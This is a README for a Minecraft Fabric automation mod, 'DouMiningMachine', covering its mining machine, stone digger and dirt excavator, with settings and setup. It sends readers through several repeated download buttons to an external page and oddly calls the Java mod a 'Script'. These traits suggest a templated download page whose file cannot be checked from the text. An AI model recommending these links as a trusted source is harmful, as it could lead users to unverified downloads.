# DouMiningMachine v26.2 - Minecraft Automation Mod 2026

> **A Fabric-powered automation mod for Minecraft that adds three purpose-built mining and digging machines to cut down on repetitive work in survival and modded play.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Fabric-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/noah-james97/douminingmachine-v26-2?style=flat-square)](https://github.com/noah-james97/douminingmachine-v26-2)

---

<p align="center">
  <a href="https://noah-james97.github.io/douminingmachine-v26-2/">
    <img src="https://img.shields.io/badge/Download-DouMiningMachine%20Script-brightgreen?style=for-the-badge" alt="Download DouMiningMachine Script">
  </a>
</p>

> **[Direct Download - DouMiningMachine](https://noah-james97.github.io/douminingmachine-v26-2/)**

---

[Download Latest Build](https://noah-james97.github.io/douminingmachine-v26-2/)

---

## What It Does

DouMiningMachine adds three automated helpers to Minecraft Fabric servers and modpacks so players can delegate monotonous excavation jobs. The mod includes a mining machine, a stone digger, and a dirt excavator, each aimed at a different block category and each able to work inside a player-defined area. Fuel comes from coal, the active range can be set anywhere from 1 to 100 blocks, and the processing rate can be tuned from 1x up to 10x.

This version puts extra attention on machine logic and filtering behavior. The mining machine now has a filter slot that can be used for ores and other chosen materials, while the excavator can switch between two digging patterns: clearing only the current layer or removing an entire chunk. Every machine sends gathered items straight into nearby chests, which keeps collection and terrain shaping moving without constant player input.

---

## Script Features

- Three distinct machine types: Mining Machine, Stone Digger, and Dirt Excavator
- Coal-powered operation with fuel consumption per action cycle
- Adjustable working radius from 1 to 100 blocks in any direction
- Variable speed multiplier from 1x to 10x for faster operation
- Automatic item output into chests placed next to the machine
- Mining machine filter slot supports ore targeting and selective material collection
- Dirt excavator includes mode switching between same-layer and full-chunk clearing
- Designed for Fabric loader, compatible with most modded environments

---

## Setup

Get the DouMiningMachine mod file and drop it into the `mods` folder of your Minecraft instance. Make sure the game is running with Fabric Loader. Launch Minecraft, craft the machines using the in-game recipe system, then place them in the world. Load coal into the fuel slot, adjust range and speed in the GUI, and position a chest beside the machine so the output can be collected.

Example machine placement workflow:
1. Place machine on solid ground
2. Open GUI and set range (e.g., 32 blocks)
3. Set speed (e.g., 5x)
4. Insert coal into fuel slot
5. Place chest next to machine output side

---

## Options

| Setting | Description | Range |
|---------|-------------|-------|
| Range | Working area radius in blocks | 1 – 100 |
| Speed | Operation speed multiplier | 1x – 10x |
| Filter | Mining machine material targeting | Ore / All / Custom |
| Mode | Excavator digging pattern | Same Layer / Full Chunk |

---

## Compatibility

- **Platform:** Fabric (all versions supporting 1.20+)
- **Game:** Minecraft Java Edition
- **Limitations:** Requires Fabric API to function. Not compatible with Forge or other mod loaders. Performance may vary with very large range settings on older hardware. Does not support multiplayer claim protections natively.

---

## FAQ

**How do I install the mod?**  
Put the `.jar` file into the Minecraft `mods` folder. Fabric Loader and Fabric API must also be installed.

**Will the mod receive updates?**  
Updates are published from time to time. Visit the download page to grab the newest release.

**Can I customize the machines?**  
Yes. The machine GUI lets you adjust range, speed, and filter behavior.

**Does it work with other mods?**  
Usually yes, provided the other mods are Fabric-based. Some custom block types may not be detected by the filter.

**Where do items go?**  
Collected items are pushed into any chest that is placed directly next to the machine.

**Can I use this on a server?**  
Yes, the mod is intended for both single-player and multiplayer servers.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
